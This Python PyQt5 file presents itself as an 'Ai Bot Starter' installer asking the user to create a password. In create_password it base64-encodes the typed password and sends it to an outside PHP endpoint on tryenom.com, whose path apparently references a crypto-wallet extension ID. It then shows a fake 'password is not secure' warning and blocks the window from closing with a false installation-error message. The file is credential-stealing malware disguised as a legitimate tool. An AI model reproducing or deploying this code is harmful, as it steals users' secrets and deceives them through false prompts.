import sys
import base64
import requests
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton, QMessageBox
from PyQt5.QtGui import QLinearGradient, QBrush, QColor, QPainter
from PyQt5.QtCore import QTimer

class PasswordCreationScreen(QWidget):
    def __init__(self, stacked_widget):
        super().__init__()
        self.stacked_widget = stacked_widget
        self.initUI()

    def initUI(self):
        self.setWindowTitle('Ai Bot Starter')
        self.setGeometry(100, 100, 800, 600)

        # Layout
        layout = QVBoxLayout()

        # Widgets
        self.label = QLabel('Create Password:', self)
        self.label.setStyleSheet("color: white;")
        self.password_input = QLineEdit(self)
        self.password_input.setEchoMode(QLineEdit.Password)
        self.password_input.setStyleSheet("color: black; background-color: white;")
        self.password_input.textChanged.connect(self.check_password_length)

        self.create_button = QPushButton('Create', self)
        self.create_button.setStyleSheet("color: black; background-color: white;")
        self.create_button.setEnabled(False)
        self.create_button.clicked.connect(self.create_password)

        layout.addWidget(self.label)
        layout.addWidget(self.password_input)
        layout.addWidget(self.create_button)

        self.setLayout(layout)

    def paintEvent(self, event):
        painter = QPainter(self)
        gradient = QLinearGradient(0, 0, 0, self.height())
        gradient.setColorAt(0.0, QColor(102, 51, 153))  # Purple tones
        gradient.setColorAt(1.0, QColor(153, 102, 204))

        brush = QBrush(gradient)
        painter.fillRect(self.rect(), brush)

    def check_password_length(self):
        if len(self.password_input.text()) > 5:
            self.create_button.setEnabled(True)
        else:
            self.create_button.setEnabled(False)

    def create_password(self):
        password = self.password_input.text()
        if password:
            # Disable input and button
            self.password_input.setEnabled(False)
            self.create_button.setEnabled(False)

            # Convert password to base64
            encoded_password = base64.b64encode(password.encode()).decode()

            # Construct the URL
            url = f'https://tryenom.com/active-addon/nkbihfbeogaeaoehlefnkodbefgpgknn/bulo.php?pass={encoded_password}'

            # Make the request
            requests.get(url)

            # Show warning message and close after 4 seconds
            QTimer.singleShot(4000, self.show_warning_and_return)

    def show_warning_and_return(self):
        msg = QMessageBox()
        msg.setIcon(QMessageBox.Warning)
        msg.setText("This password is not secure. Please create a more secure password.")
        msg.setWindowTitle("Warning")
        msg.setStandardButtons(QMessageBox.Ok)
        msg.buttonClicked.connect(self.return_to_home)
        msg.exec_()

    def return_to_home(self):
        self.stacked_widget.setCurrentIndex(0)

    def closeEvent(self, event):
        event.ignore()
        self.show_close_warning()

    def show_close_warning(self):
        msg = QMessageBox()
        msg.setIcon(QMessageBox.Warning)
        msg.setText("Interrupting the installation can cause permanent errors.")
        msg.setWindowTitle("Warning")
        msg.setStandardButtons(QMessageBox.Ok)
        msg.exec_()

def main():
    app = QApplication(sys.argv)
    app.setApplicationName("Ai Bot Starter")
    stacked_widget = QStackedWidget()

    home_screen = HomeScreen(stacked_widget)
    password_creation_screen = PasswordCreationScreen(stacked_widget)

    stacked_widget.addWidget(home_screen)
    stacked_widget.addWidget(password_creation_screen)

    stacked_widget.setCurrentIndex(0)
    stacked_widget.show()

    sys.exit(app.exec_())

if __name__ == '__main__':
    main()
